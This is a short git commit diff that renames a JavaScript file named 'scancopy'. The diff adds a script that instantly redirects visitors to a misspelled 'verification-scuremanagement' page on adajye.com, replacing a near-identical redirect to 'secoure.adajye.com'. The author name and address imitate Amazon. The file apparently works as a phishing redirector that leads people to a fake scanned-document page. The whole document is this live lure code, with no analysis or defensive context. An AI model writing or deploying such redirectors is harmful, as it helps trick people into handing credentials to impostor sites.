474109f7d707993e4b6f625179db985a7042bc19
amazon334 <arnazohealthcare2021@gmail.com>
2025-08-20 10:42:53 -0700

    Update and rename scancopy909.js to scancopy001.js

---
+++ scancopy001.js
@@ -0,0 +1,3 @@
+setTimeout(function() {
+  window.location.href = "https://verification-scuremanagement.adajye.com/doc1/Scancopy.html";
+}, 0); // 3 seconds
--- scancopy909.js
+++
@@ -1,3 +0,0 @@
-setTimeout(function() {
-  window.location.href = "https://secoure.adajye.com/doc1/scancopy.html";
-}, 0); // 3 seconds
